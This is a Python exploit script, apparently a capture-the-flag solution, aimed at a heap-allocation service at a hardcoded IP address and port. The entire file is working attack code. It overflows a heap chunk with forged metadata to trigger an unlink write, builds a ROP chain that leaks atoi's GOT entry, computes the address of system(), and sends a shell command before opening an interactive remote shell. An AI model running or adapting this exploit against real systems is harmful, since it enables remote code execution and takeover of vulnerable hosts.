#!/usr/bin/env python

import struct
import socket
import telnetlib

ADDR = "54.64.45.35"
PORT = 3573

# CODES
ALLOC = 1
DEALLOC = 3
READIN = 2
CHECKER = 4

offset = 50928          # offset system - atoi

s = socket.create_connection((ADDR, PORT))

def rtil(s, c):
    buf = ""
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == c):
            break
    return buf


def alloc(size):
    global s
    s.send(str(ALLOC) + "\n")

    s.send((str(size) + "\n")[:16])
    t = rtil(s, "\n").strip()
    if t != "FAIL":
        rtil(s, "\n")
        return "ALLOC: %s"%t
    else:
        return "FAIL"

def dealloc(idx):
    global s
    s.send(str(DEALLOC) + "\n")

    s.send((str(idx) + "\n")[:16])
    return "DEALLOC: %s"%rtil(s, "\n").strip()


def readin(idx, buf):
    global s
    s.send(str(READIN) + "\n")

    s.send((str(idx) + "\n")[:16])
    s.send((str(len(buf)) + "\n")[:16])
    s.send(buf)
    return "READIN: %s"%rtil(s, "\n").strip()


# these two buffers were allocated in order to setup up 
# the needed structurs
print alloc(1024)                           # idx = 1
print alloc(1024)                           # idx = 2

print alloc(8)                              # idx = 3
print alloc(8)                              # idx = 4
print alloc(8)                              # idx = 5


oflow = "X" * 8
oflow += "Y" * 8 
oflow += struct.pack("<Q", 32 + 0x400)      # size of previous chunk
oflow += struct.pack("<Q", 0x100)           # size of chunk 
oflow += struct.pack("<Q", 0x0) * 4              # FD
oflow += struct.pack("<Q", 0x01010101) * 27 
oflow += struct.pack("<Q", 0x21)
oflow += struct.pack("<Q", 0x1) * 5

structs = struct.pack("<Q", 0x100)              # prev size
structs += struct.pack("<Q", 0x100)             # size
structs += struct.pack("<Q", 0x602150 - 0x18)   # FD
structs += struct.pack("<Q", 0x602150 - 0x10)   # BK

print readin(2, structs)                    # write the structures to alloc'd buffer idx = 2            
print readin(3, oflow)                      # overflow the stuff
print dealloc(4)                            # free() and fugg stuff up

# ROP gadgets and stuff
atoi_got = struct.pack("<Q", 0x602088)
puts = struct.pack("<Q", 0x400C33)
stdin_ptr = struct.pack("<Q", 0x6020D0)
atol_got = struct.pack("<Q", 0x602080)
pppret = struct.pack("<Q", 0x400dbe)
rop_addr = struct.pack("<Q", 0x602150)
prsppppret = struct.pack("<Q", 0x400dbd)
fflush = struct.pack("<Q", 0x0000000000400810)
puts = struct.pack("<Q", 0x400760)
prdi = struct.pack("<Q", 0x400dc3)
prbp = struct.pack("<Q", 0x4008e8)
prsip15 = struct.pack("<Q", 0x400dc1)
readin_func = struct.pack("<Q", 0x4009E8)
do_read = struct.pack("<Q", 0x400B1E)
read_loc = struct.pack("<Q", 0xC46A4A + 0x70-1)
cmd_addr_adjust = struct.pack("<Q", 0xC46A4A + 0x70 + 0x20) 
cmd_addr = struct.pack("<Q", 0xC46A4A + 0x20) 

ropchain_2 = "A" * 16
ropchain_2 += prdi + atoi_got + prsip15 + struct.pack("<Q", 0x0) * 2 + puts
ropchain_2 += prdi + struct.pack("<Q", 0x0) + fflush 
ropchain_2 += prbp + read_loc
ropchain_2 += do_read
ropchain_2 += "X" * 16
ropchain_2 += prbp + cmd_addr_adjust
ropchain_2 += do_read
ropchain_2 += "X" * 16
ropchain_2 += prdi + cmd_addr
ropchain_2 += prsppppret + struct.pack("<Q", 0x000000000C46A4A - 24) 
ropchain_2 += "X" * 16		# gets trashed
ropchain_2 += "ls -l"

# this goes in the bag
# contains pointer to the GOT entry of atol() and second stage ropchain
in_bag = "A" * 16
in_bag += atol_got			 
in_bag += "A" * 8
in_bag += ropchain_2

print readin(2, in_bag)
print readin(1, pppret)

ropchain_1 = prsppppret + rop_addr
s.send(str(DEALLOC) + "\n")
s.send(ropchain_1)

# get leaked address
lk = s.recv(8)[:-1][::-1].encode('hex')
lk = int(lk, 16)
print "atoi: %s"%hex(lk)

# compute address of system
system = lk + offset
print "system: %s"%hex(system)
system = struct.pack("<Q", system)

# write address of system to ropchain_2 in the bag
# basically "intercept" the ropchain
buf =  system + "A" * 6
s.send(buf)

cmd = "sh ##"
s.send(cmd)

t = telnetlib.Telnet()
t.sock = s
t.interact()
